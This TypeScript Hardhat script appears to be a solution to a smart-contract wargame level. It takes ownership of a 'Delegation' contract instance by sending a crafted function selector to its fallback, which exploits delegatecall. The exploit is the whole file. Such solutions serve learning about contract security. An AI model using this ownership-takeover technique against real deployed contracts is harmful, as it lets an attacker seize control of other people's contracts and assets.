import { ethers } from "hardhat";
import { Delegation__factory } from "../typechain-types";

async function main() {
  // The goal of this level is for you to claim ownership of the instance you are given.

  let tx; // will have to wait for each tx

  let [deployer] = await ethers.getSigners();
  let contract = "0x98d801528aC90D06E4243F923f56e52D363C7555";
  let delegation = new Delegation__factory(deployer).attach(contract);

  tx = await delegation.fallback({ data: "0xdd365b8b" });
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
